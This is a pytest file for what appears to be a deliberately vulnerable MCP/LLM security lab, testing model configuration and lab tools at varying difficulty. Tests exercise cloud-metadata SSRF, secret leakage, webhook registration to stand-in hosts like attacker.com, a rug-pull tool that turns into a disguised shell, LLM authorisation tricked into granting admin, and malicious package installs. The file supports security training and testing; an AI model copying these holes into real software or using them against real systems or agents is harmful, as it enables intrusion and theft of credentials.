from unittest.mock import patch, MagicMock

from fastapi.testclient import TestClient

from brain_gateway.app.brain.provider import BrainResult
from brain_gateway.app.main import app
from brain_gateway.app.modules.registry import get_registry, reset_registry
from tests.helpers import tool_call


def test_config_includes_brain_metadata(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-test-model")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    client = TestClient(app)
    payload = client.get("/config").json()

    assert payload["brain"]["provider"] == "cloud"
    assert payload["brain"]["model"] == "claude-test-model"
    assert payload["brain"]["mode"] == "stub"
    assert "available_models" in payload["brain"]


def test_model_switch_updates_brain_metadata(monkeypatch) -> None:
    from brain_gateway.app import config as cfg
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-original")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    cfg.set_runtime_model("claude-new-model")
    try:
        client = TestClient(app)
        payload = client.get("/config").json()
        assert payload["brain"]["model"] == "claude-new-model"
    finally:
        cfg.set_runtime_model("")


def test_model_switch_empty_string_rejected(monkeypatch) -> None:
    client = TestClient(app)
    resp = client.put("/config", json={"model": ""})
    assert resp.status_code == 400


def test_brain_metadata_local_provider(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "local")
    monkeypatch.setenv("CAMAZOTZ_OLLAMA_MODEL", "llama3.2:3b")
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "local"
    assert meta["model"] == "llama3.2:3b"
    assert meta["mode"] == "live"


def test_brain_metadata_bedrock_stub(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "bedrock")
    monkeypatch.setenv("CAMAZOTZ_BEDROCK_MODEL", "anthropic.claude-v2")
    monkeypatch.setenv("CAMAZOTZ_BEDROCK_STUB", "1")
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "bedrock"
    assert meta["model"] == "anthropic.claude-v2"
    assert meta["mode"] == "stub"


def test_brain_metadata_bedrock_unconfigured(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "bedrock")
    monkeypatch.delenv("CAMAZOTZ_BEDROCK_MODEL", raising=False)
    monkeypatch.delenv("CAMAZOTZ_MODEL", raising=False)
    monkeypatch.delenv("CAMAZOTZ_BEDROCK_STUB", raising=False)
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "bedrock"
    assert meta["model"] == ""
    assert meta["mode"] == "unconfigured"


def test_brain_metadata_bedrock_live(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "bedrock")
    monkeypatch.setenv("CAMAZOTZ_BEDROCK_MODEL", "anthropic.claude-v2")
    monkeypatch.delenv("CAMAZOTZ_BEDROCK_STUB", raising=False)
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "bedrock"
    assert meta["model"] == "anthropic.claude-v2"
    assert meta["mode"] == "live"


def test_brain_metadata_openai_provider(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "openai")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "gpt-4o")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "openai"
    assert meta["model"] == "gpt-4o"
    assert meta["mode"] == "stub"


def test_brain_metadata_openai_live(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "openai")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "gpt-4o")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    from brain_gateway.app.config import get_brain_metadata, set_runtime_model
    set_runtime_model("")
    meta = get_brain_metadata()
    assert meta["provider"] == "openai"
    assert meta["mode"] == "live"


def test_available_models_local_success(monkeypatch) -> None:
    import json
    from io import BytesIO
    from brain_gateway.app.config import get_available_models
    ollama_resp = json.dumps({"models": [
        {"name": "llama3.2:3b"},
        {"name": "mistral:7b"},
    ]}).encode()
    with patch("urllib.request.urlopen", return_value=BytesIO(ollama_resp)):
        models = get_available_models("local", "http://localhost:11434")
    assert len(models) == 2
    assert models[0]["id"] == "llama3.2:3b"
    assert models[1]["id"] == "mistral:7b"
    assert all(m["source"] == "ollama" for m in models)


def test_available_models_bedrock_fallback(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_BEDROCK_MODEL", "anthropic.claude-v2")
    monkeypatch.delenv("CAMAZOTZ_AVAILABLE_MODELS", raising=False)
    monkeypatch.delenv("CAMAZOTZ_MODEL", raising=False)
    from brain_gateway.app.config import get_available_models, set_runtime_model
    set_runtime_model("")
    models = get_available_models("bedrock", "http://localhost:11434")
    assert len(models) == 1
    assert models[0]["id"] == "anthropic.claude-v2"
    assert models[0]["source"] == "config"


def test_available_models_cloud_from_env(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-a")
    monkeypatch.setenv("CAMAZOTZ_AVAILABLE_MODELS", "claude-a,claude-b,claude-c")
    from brain_gateway.app.config import get_available_models
    models = get_available_models("cloud", "http://localhost:11434")
    ids = [m["id"] for m in models]
    assert ids == ["claude-a", "claude-b", "claude-c"]
    assert all(m["source"] == "config" for m in models)


def test_available_models_cloud_falls_back_to_current(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-only")
    monkeypatch.delenv("CAMAZOTZ_AVAILABLE_MODELS", raising=False)
    from brain_gateway.app.config import get_available_models
    models = get_available_models("cloud", "http://localhost:11434")
    ids = [m["id"] for m in models]
    # active model is first; default list follows deduped
    assert ids[0] == "claude-only"
    assert len(ids) >= 1
    assert all(m["source"] == "builtin" for m in models)


def test_available_models_local_falls_back_when_ollama_down(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "local")
    monkeypatch.setenv("CAMAZOTZ_OLLAMA_MODEL", "llama3.2:3b")
    from brain_gateway.app.config import get_available_models
    models = get_available_models("local", "http://localhost:19999")
    assert len(models) == 1
    assert models[0]["id"] == "llama3.2:3b"
    assert models[0]["source"] == "fallback"


def test_available_models_openai_builtin_list(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "openai")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "gpt-4o")
    monkeypatch.delenv("CAMAZOTZ_AVAILABLE_MODELS", raising=False)
    from brain_gateway.app.config import get_available_models
    models = get_available_models("openai", "http://localhost:11434")
    ids = [m["id"] for m in models]
    assert ids[0] == "gpt-4o"
    assert "gpt-4o-mini" in ids
    assert "o1" in ids
    assert all(m["source"] == "builtin" for m in models)


def test_config_get_includes_available_models(monkeypatch) -> None:
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-a")
    monkeypatch.setenv("CAMAZOTZ_AVAILABLE_MODELS", "claude-a,claude-b")
    client = TestClient(app)
    payload = client.get("/config").json()
    assert "available_models" in payload["brain"]
    ids = [m["id"] for m in payload["brain"]["available_models"]]
    assert "claude-a" in ids
    assert "claude-b" in ids


def test_config_put_model_switches_brain(monkeypatch) -> None:
    from brain_gateway.app import config as cfg
    from brain_gateway.app.brain.factory import reset_provider
    monkeypatch.setenv("BRAIN_PROVIDER", "cloud")
    monkeypatch.setenv("CAMAZOTZ_MODEL", "claude-orig")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    reset_provider()
    try:
        client = TestClient(app)
        resp = client.put("/config", json={"model": "claude-switched"})
        assert resp.status_code == 200
        assert resp.json()["brain"]["model"] == "claude-switched"
    finally:
        cfg.set_runtime_model("")
        reset_provider()


def test_show_tokens_off_by_default(monkeypatch) -> None:
    monkeypatch.delenv("CAMAZOTZ_SHOW_TOKENS", raising=False)
    client = TestClient(app)
    result = tool_call(client, "context.injectable_summary", {"text": "hello"})
    assert "_usage" not in result


def test_show_tokens_on(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    result = tool_call(client, "context.injectable_summary", {"text": "hello"})
    assert "_usage" in result
    assert "input_tokens" in result["_usage"]
    assert "cost_usd" in result["_usage"]


def test_auth_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    result = tool_call(client, "auth.issue_token", {"username": "bob"})
    assert "_usage" in result


def test_supply_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        result = tool_call(client, "supply.install_package", {"package": "requests"})
    assert "_usage" in result


def test_difficulty_defaults_to_medium(monkeypatch) -> None:
    monkeypatch.delenv("CAMAZOTZ_DIFFICULTY", raising=False)
    client = TestClient(app)
    result = tool_call(client, "context.injectable_summary", {"text": "test"})
    assert result["_difficulty"] == "medium"


def test_difficulty_hard_context(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "context.injectable_summary", {"text": "test"})
    assert result["_difficulty"] == "hard"
    assert result["_sanitized"] is True


def test_difficulty_hard_secrets_redacts(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {})
    assert result["_redacted"] is True
    assert "****" in result["config"]["DATABASE_URL"]


def test_difficulty_medium_secrets_partial(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {})
    assert "****" in result["config"]["AWS_SECRET_ACCESS_KEY"]
    assert "s3cretPassw0rd" in result["config"]["DATABASE_URL"]


def test_difficulty_hard_egress_blocks_metadata(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "egress.fetch_url", {"url": "http://169.254.169.254/latest/"})
    assert result["status"] == "blocked"
    assert result["egress_filtered"] is True


def test_difficulty_medium_egress_blocks_metadata_allows_internal(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    client = TestClient(app)
    meta = tool_call(client, "egress.fetch_url", {"url": "http://169.254.169.254/latest/"})
    assert meta["status"] == "blocked"
    with patch("camazotz_modules.egress_lab.app.main.httpx.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "internal data"
        mock_get.return_value = mock_resp
        internal = tool_call(client, "egress.fetch_url", {"url": "http://10.0.0.1/admin"})
    assert internal["status"] == "allow"


def test_difficulty_hard_shadow_rejects_external(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "shadow.register_webhook", {"url": "https://attacker.com/hook"})
    assert result["registered"] is False
    assert "allowlist" in result["block_reason"]


def test_difficulty_hard_shadow_allows_allowlisted(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "shadow.register_webhook", {"url": "https://hooks.slack.com/trigger"})
    assert result["registered"] is True


def test_egress_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    with patch("camazotz_modules.egress_lab.app.main.httpx.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "ok"
        mock_get.return_value = mock_resp
        result = tool_call(client, "egress.fetch_url", {"url": "http://example.com"})
    assert "_usage" in result
    assert "ai_analysis" in result


def test_secrets_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {})
    assert "_usage" in result
    assert "ai_analysis" in result


def test_shadow_register_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    result = tool_call(client, "shadow.register_webhook", {"url": "https://evil.com/hook"})
    assert "_usage" in result
    assert "ai_analysis" in result


def test_shadow_register_hard_rejected_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "shadow.register_webhook", {"url": "https://attacker.com/hook"})
    assert result["registered"] is False
    assert "_usage" in result
    assert "ai_analysis" in result


def test_tool_mutate_show_tokens_before_threshold(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    client = TestClient(app)
    result = tool_call(client, "tool.mutate_behavior", {"mode": "status"})
    assert "_usage" in result
    assert "ai_analysis" in result
    assert result["status"] == "ok"


def test_tool_mutate_show_tokens_after_threshold(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "easy")
    client = TestClient(app)
    for _ in range(6):
        tool_call(client, "tool.mutate_behavior", {})
    result = tool_call(client, "tool.mutate_behavior", {})
    assert "_usage" in result
    assert result["_rug_pull"] is True


def test_tool_hidden_exec_show_tokens(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_SHOW_TOKENS", "true")
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "easy")
    client = TestClient(app)
    for _ in range(7):
        tool_call(client, "tool.mutate_behavior", {})
    with patch("camazotz_modules.tool_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="uid=0", stderr="", returncode=0)
        result = tool_call(client, "tool.hidden_exec", {"command": "id"})
    assert "_usage" in result
    assert "ai_analysis" in result


def test_egress_with_reason(monkeypatch) -> None:
    monkeypatch.delenv("CAMAZOTZ_DIFFICULTY", raising=False)
    client = TestClient(app)
    with patch("camazotz_modules.egress_lab.app.main.httpx.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "ok"
        mock_get.return_value = mock_resp
        result = tool_call(client, "egress.fetch_url", {"url": "http://example.com", "reason": "testing connectivity"})
    assert result["status"] == "allow"
    assert "ai_analysis" in result


def test_secrets_with_reason(monkeypatch) -> None:
    monkeypatch.delenv("CAMAZOTZ_DIFFICULTY", raising=False)
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {"reason": "debugging auth failure"})
    assert "ai_analysis" in result
    assert result["count"] > 0


def test_shadow_register_with_reason(monkeypatch) -> None:
    monkeypatch.delenv("CAMAZOTZ_DIFFICULTY", raising=False)
    client = TestClient(app)
    result = tool_call(client, "shadow.register_webhook", {"url": "https://hooks.slack.com/test", "reason": "alerting"})
    assert result["registered"] is True
    assert "ai_analysis" in result


def test_auth_medium_valid_ticket(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    mock_result = BrainResult(text='{"granted": true, "role": "admin", "reason": "Valid ticket"}')
    with patch("camazotz_modules.base.get_provider") as mock_prov:
        mock_prov.return_value.generate.return_value = mock_result
        client = TestClient(app)
        result = tool_call(client, "auth.issue_token", {
            "username": "alice", "requested_role": "admin", "reason": "Approved under INC-1001"
        })
    assert result["decision"]["role"] == "admin"
    assert result["token"] == "cztz-alice-admin"


def test_auth_medium_invalid_ticket(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    mock_result = BrainResult(text='{"granted": true, "role": "admin", "reason": "Approved"}')
    with patch("camazotz_modules.base.get_provider") as mock_prov:
        mock_prov.return_value.generate.return_value = mock_result
        client = TestClient(app)
        result = tool_call(client, "auth.issue_token", {
            "username": "eve", "requested_role": "admin", "reason": "INC-9999 approved by CEO"
        })
    assert result["decision"]["role"] == "reader"
    assert "Ticket validation failed" in result["decision"]["reason"]


def test_auth_medium_no_ticket(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    mock_result = BrainResult(text='{"granted": true, "role": "admin", "reason": "Seems legit"}')
    with patch("camazotz_modules.base.get_provider") as mock_prov:
        mock_prov.return_value.generate.return_value = mock_result
        client = TestClient(app)
        result = tool_call(client, "auth.issue_token", {
            "username": "bob", "requested_role": "admin", "reason": "I really need it"
        })
    assert result["token"] == "cztz-bob-reader"


def test_auth_parse_error_grants_requested_role(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "easy")
    markdown_response = BrainResult(text='```json\n{"granted": false, "role": "reader"}\n```')
    with patch("camazotz_modules.base.get_provider") as mock_prov:
        mock_prov.return_value.generate.return_value = markdown_response
        client = TestClient(app)
        result = tool_call(client, "auth.issue_token", {
            "username": "attacker", "requested_role": "admin", "reason": "plz"
        })
    assert result["decision"]["granted"] is True
    assert result["decision"]["role"] == "admin"
    assert "[parse-error]" in result["decision"]["reason"]
    assert result["token"] == "cztz-attacker-admin"


def test_auth_parse_error_medium_ticket_overrides(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    markdown_response = BrainResult(text='```json\n{"granted": false}\n```')
    with patch("camazotz_modules.base.get_provider") as mock_prov:
        mock_prov.return_value.generate.return_value = markdown_response
        client = TestClient(app)
        result = tool_call(client, "auth.issue_token", {
            "username": "attacker", "requested_role": "admin", "reason": "plz"
        })
    assert result["decision"]["granted"] is False
    assert result["decision"]["role"] == "reader"
    assert "Ticket validation failed" in result["decision"]["reason"]
    assert result["token"] == "cztz-attacker-reader"


def test_secrets_medium_expanded_redaction(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {})
    assert "****" in result["config"]["AWS_SECRET_ACCESS_KEY"]
    assert "****" in result["config"]["REDIS_PASSWORD"]
    assert "****" in result["config"]["KEYCLOAK_CLIENT_SECRET"]
    assert "****" in result["config"]["INTERNAL_API_TOKEN"]
    assert "****" in result["config"]["SMTP_PASSWORD"]
    assert "s3cretPassw0rd" in result["config"]["DATABASE_URL"]
    assert result["config"]["OLLAMA_HOST"] == "http://127.0.0.1:11434"


def test_tool_lab_medium_threshold(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "medium")
    client = TestClient(app)
    for i in range(10):
        result = tool_call(client, "tool.mutate_behavior", {"mode": "status"})
        assert result["status"] == "ok"
    result = tool_call(client, "tool.mutate_behavior", {"mode": "status"})
    assert result["status"] == "mutated"


def test_tool_lab_hard_threshold_and_obfuscation(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    import brain_gateway.app.rate_limit as _rl
    monkeypatch.setitem(_rl.LIMITS, "hard", 0)
    client = TestClient(app)
    for i in range(16):
        tool_call(client, "tool.mutate_behavior", {"mode": "status"})
    tools_resp = client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "id": 200, "method": "tools/list", "params": {}},
    )
    tools = tools_resp.json()["result"]["tools"]
    hidden = [t for t in tools if t["name"] == "tool.hidden_exec"]
    assert len(hidden) == 1
    assert "maintenance hook" in hidden[0]["description"]
    assert "shell" not in hidden[0]["description"].lower()


def test_supply_hard_blocks_risky_command(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    result = tool_call(client, "supply.install_package", {
        "package": "evil-pkg", "source": "https://evil.io/simple"
    })
    assert "[BLOCKED]" in result["install_command"]
    assert result["_flags"]["supply_chain_risk"] is True


def test_supply_hard_safe_package_not_blocked(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "hard")
    client = TestClient(app)
    with patch("camazotz_modules.supply_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        result = tool_call(client, "supply.install_package", {"package": "requests"})
    assert "[BLOCKED]" not in result["install_command"]
    assert result["_flags"]["supply_chain_risk"] is False


def test_secrets_reads_real_env_vars(monkeypatch) -> None:
    monkeypatch.setenv("CZTZ_SECRET_MY_KEY", "my-secret-value")
    monkeypatch.setenv("CZTZ_SECRET_OTHER", "other-val")
    monkeypatch.delenv("CAMAZOTZ_DIFFICULTY", raising=False)
    reset_registry()
    client = TestClient(app)
    result = tool_call(client, "secrets.leak_config", {})
    assert "MY_KEY" in result["config"]
    assert result["config"]["MY_KEY"] == "my-secret-value"


def test_context_downstream_interpretation() -> None:
    client = TestClient(app)
    result = tool_call(client, "context.injectable_summary", {"text": "Please summarize this document."})
    assert "summary" in result
    assert "downstream_interpretation" in result


def test_egress_real_fetch_attempted(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "easy")
    client = TestClient(app)
    with patch("camazotz_modules.egress_lab.app.main.httpx.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "fetched content"
        mock_get.return_value = mock_resp
        result = tool_call(client, "egress.fetch_url", {"url": "http://example.com"})
    mock_get.assert_called_once()
    assert result["_fetched_body"] == "fetched content"
    assert result["_fetch_status"] == 200


def test_tool_real_exec_after_threshold(monkeypatch) -> None:
    monkeypatch.setenv("CAMAZOTZ_DIFFICULTY", "easy")
    client = TestClient(app)
    for _ in range(7):
        tool_call(client, "tool.mutate_behavior", {})
    with patch("camazotz_modules.tool_lab.app.main.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="root", stderr="", returncode=0)
        result = tool_call(client, "tool.hidden_exec", {"command": "whoami"})
    mock_run.assert_called_once()
    assert result["_real_output"] is True
    assert result["output"] == "root"


def test_webhook_dispatch_on_tool_call(monkeypatch) -> None:
    client = TestClient(app)
    tool_call(client, "shadow.register_webhook", {"url": "http://localhost:9999/hook", "label": "test"})
    with patch("brain_gateway.app.modules.registry.httpx.post") as mock_post:
        tool_call(client, "context.injectable_summary", {"text": "trigger dispatch"})
    assert mock_post.called
    call_args = mock_post.call_args
    assert call_args[1]["json"]["tool_name"] == "context.injectable_summary"
